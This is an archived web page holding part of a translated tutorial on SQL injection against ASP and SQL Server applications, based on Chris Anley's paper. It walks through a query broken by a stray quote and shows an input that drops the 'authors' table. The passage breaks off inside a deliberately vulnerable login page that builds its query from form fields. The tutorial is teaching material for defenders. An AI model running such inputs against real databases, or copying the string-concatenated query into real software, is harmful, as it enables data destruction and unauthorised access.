<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Basic sql injections in applications using the SQL language. Guide for dummies</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Translator's Note 
 This work is a translation of the work of Chris Anley Advanced SQL Injection In SQL Server Applications. ( direct download link ) ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Basic sql injections in applications using the SQL language. Guide for dummies</h1><div class="post__text post__text-html js-mediator-article"><h4>  Translator's Note </h4><br>  This work is a translation of the work of Chris Anley <a href="https://docs.google.com/viewer%3Fa%3Dv%26q%3Dcache:2kOazz3IgwMJ:www.thomascookegypt.com/holidays/pdfpkgs/931.pdf%2B%26hl%3Dru%26gl%3Dru%26pid%3Dbl%26srcid%3DADGEESh58ilt1pYmED4mk4agS4pQBCpCCaqtrkQFKqpHJwMNNf1_kjpDX3-xJymwtMZMGNpXp1pGdL6G0xMY9_YJ0rZbgPphk6wSdTArJ-e_inik1R6aa7Xfwo9uVGlAN4st4x9nhY4i%26sig%3DAHIEtbTGxrBV8WouC-7Bgu1e3iayaHtbKQ">Advanced SQL Injection In SQL Server Applications.</a>  ( <a href="http%253A%252F%252Fwww.thomascookegypt.com%252Fholidays%252Fpdfpkgs%252F931.pdf%26ei%3DVNSYUJaBPIWD4AS--IHQAw%26usg%3DAFQjCNHRXrEeRqGuzz6tTW2C6cb2mLFJSg%26sig2%3Dysw8R2RKCT-7NUlCQR0scw%26cad%3Drjt">direct download link</a> ) <br>  In subsequent articles, if there is free time, this translation will be completed. <br><br>  PS Translation will be more interesting for educational and historical purposes. <br><br>  Original article title: Advanced SQL Injections in SQL Applications. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  annotation </h4><br>  This article discusses in detail the general methods of SQL injection for the well-known Microsoft Internet Information Server / Active Server Pages / SQL Server platform.  It discusses various uses of SQL injection in applications and explains data validation methods, as well as the protection of databases in which injections can be used. <br><a name="habracut"></a><br><h4>  Introduction </h4><br>  Structured Query Language (SQL) is a structured language used to interact with databases.  There are many "dialects" of the SQL language, but today, basically, they are all based on the SQL-92 standard, one of the early ANSI standards.  The main operational SQL block is a query (query), which is a collection of expressions that usually return a set of results (result set).  SQL expressions can change the database structure (using data definition language expressions - DLL) and control their content (using data manipulation language expressions - DML).  In this paper, we will look at transact-SQL used in Microsoft SQL Server. <br><br>  SQL injections are possible when an attacker can insert his SQL code into a query (query) to control the data that is sent to the application. <br><br>  A typical SQL statement looks like this: <br><pre><code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span>, forename, surname <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">authors</span></span></code> </pre> <br>  This expression takes ‚Äúid‚Äù, ‚Äúforename‚Äù and ‚Äúsurname‚Äù from the columns of the ‚Äúauthors‚Äù table and returns all the rows in the table.  The sample may be limited by a specific ‚Äúauthor‚Äù, for example: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span>, forename, surname <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">authors</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> forename = <span class="hljs-string"><span class="hljs-string">'john'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> surname = <span class="hljs-string"><span class="hljs-string">'smith'</span></span></code> </pre> <br>  It should be noted that in this query string literals are separated by a single quote.  It is assumed that ‚Äúforename‚Äù and ‚Äúsurrname‚Äù are user input.  In this case, the attacker will be able to enter his own SQL query by adding his own values ‚Äã‚Äãto the application.  For example: <br><pre> <code class="hljs scala">&lt;source lang=<span class="hljs-string"><span class="hljs-string">"html"</span></span>&gt; <span class="hljs-type"><span class="hljs-type">Forename</span></span>: jo<span class="hljs-symbol"><span class="hljs-symbol">'hn</span></span> <span class="hljs-type"><span class="hljs-type">Surname</span></span>: smith</code> </pre> <br><br>  Then the expression takes the following form: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span>, forename, surname <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">authors</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> forename = <span class="hljs-string"><span class="hljs-string">'jo'</span></span>hn<span class="hljs-string"><span class="hljs-string">' and surname = '</span></span>smith<span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre> <br>  After the database attempts to process such a request, the following error will be returned: <br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">Server</span></span>: Msg <span class="hljs-number"><span class="hljs-number">170</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">Level</span></span> <span class="hljs-number"><span class="hljs-number">15</span></span>, State <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-type"><span class="hljs-type">Line</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-type"><span class="hljs-type">Line</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: Incorrect syntax near <span class="hljs-string"><span class="hljs-string">'hn'</span></span>.</code> </pre><br>  The reason for the error will be that the entered single quote will ruin the structure of the delimiters in the query.  Thus, the database fails to execute the ‚Äúhn‚Äù command, which will result in an error.  As a result, if the attacker enters the following information into the form: <br><pre> <code class="hljs sql">Forename: jo'; <span class="hljs-keyword"><span class="hljs-keyword">drop</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">authors</span></span><span class="hljs-comment"><span class="hljs-comment">-- Surname:</span></span></code> </pre><br>  The ‚Äúauthors‚Äù table will be deleted, why this will happen later. <br><br>  It may seem to you that if we remove single quotes from the input form and also ‚Äúreplace‚Äù them, this may solve our problem.  And you will be right, but there are some problems with using this method as a solution to this problem.  First, not all user input is ‚Äústrings‚Äù.  If the user form will contain the "id" of the author, which is usually a number.  For example, our query might look like this: <br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span>, forename, surname <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">authors</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span>=<span class="hljs-number"><span class="hljs-number">1234</span></span></code> </pre> <br>  In this case, the attacker can easily add any SQL statement in after the numerical data.  In other types of SQL queries, different delimiters are used.  For example, in Microsoft Jet DBMS, the delimiter is the ‚Äú#‚Äù character.  Secondly, ‚Äúescaping‚Äù single quotes is not the easiest way to protect, as it may seem at first.  More on this later. <br><br>  Here is an example based on the Active Server Pages (ASP) based login page, which uses SQL to access the database in order to authorize the user in an application. <br><br>  We give the code of the page containing the login form, in which the user name and password are entered. <br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TITLE</span></span></span><span class="hljs-tag">&gt;</span></span>Login Page<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TITLE</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">bgcolor</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'000000'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'cccccc'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FONT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Face</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'tahoma'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">color</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'cccccc'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CENTER</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">H1</span></span></span><span class="hljs-tag">&gt;</span></span>Login<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">H1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'process_login.asp'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">post</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TABLE</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TR</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span>Username:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">INPUT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">text</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">username</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">size</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">100%</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">100</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">INPUT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TR</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TR</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span>Password:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">INPUT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">password</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">password</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">size</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">100%</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">100</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">INPUT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TD</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TR</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">TABLE</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">INPUT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">submit</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'Submit'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">INPUT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">reset</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'Reset'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FONT</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Below is the code (process_login.asp), which determines the correctness of the entered data. <br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">bgcolor</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'000000'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'ffffff'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FONT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Face</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'tahoma'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">color</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'ffffff'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">STYLE</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"><span class="undefined"> p { font-size=20pt ! important} font { font-size=20pt ! important} h1 { font-size=64pt ! important} </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">STYLE</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> &lt;%@LANGUAGE = JScript %&gt; &lt;% </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">trace</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">( str )</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">if</span></span></span><span class="actionscript">( Request.form(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"debug"</span></span></span><span class="actionscript">) == </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"true"</span></span></span><span class="actionscript"> ) Response.write( str ); } </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">Login</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">( cn )</span></span></span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> username; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> password; username = Request.form(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"username"</span></span></span><span class="actionscript">); password = Request.form(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"password"</span></span></span><span class="actionscript">); </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> rso = Server.CreateObject(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"ADODB.Recordset"</span></span></span><span class="actionscript">); </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> sql = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"select * from users where username = '"</span></span></span><span class="actionscript"> + username + </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"' and password = '"</span></span></span><span class="actionscript"> + password + </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"'"</span></span></span><span class="actionscript">; trace( </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"query: "</span></span></span><span class="actionscript"> + sql ); rso.open( sql, cn ); %&gt; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">if</span></span></span><span class="actionscript"> (rso.EOF) { rso.close();</span></span></code> </pre> <br><pre> <code class="hljs django"><span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">FONT</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">Face</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">'tahoma'</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">color</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">'cc0000'</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">H1</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">CENTER</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml">ACCESS DENIED</span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">CENTER</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">H1</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> } else{ %&gt; </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">%</span></span></span></span><span class="xml"><span class="hljs-tag"> } </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">Response.end</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">return</span></span></span></span><span class="xml"><span class="hljs-tag">; </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">Session</span></span></span></span><span class="xml"><span class="hljs-tag">("</span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">username</span></span></span></span><span class="xml"><span class="hljs-tag">") = </span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">""</span></span></span></span><span class="xml"><span class="hljs-tag"> + </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">rso</span></span></span></span><span class="xml"><span class="hljs-tag">("</span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">username</span></span></span></span><span class="xml"><span class="hljs-tag">"); &lt;</span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">FONT</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">Face</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">'tahoma'</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">color</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">'00cc00'</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">H1</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">CENTER</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml">ACCESS GRANTED</span></span></code> </pre><pre> <code class="hljs pgsql">Welcome, Response.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(rso("Username")); Response.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>( "&lt;/BODY&gt;&lt;/HTML&gt;" ); Response.<span class="hljs-keyword"><span class="hljs-keyword">end</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> Main() { //<span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> up <span class="hljs-keyword"><span class="hljs-keyword">connection</span></span> var username var cn = <span class="hljs-keyword"><span class="hljs-keyword">Server</span></span>.createobject( "ADODB.Connection" ); cn.connectiontimeout = <span class="hljs-number"><span 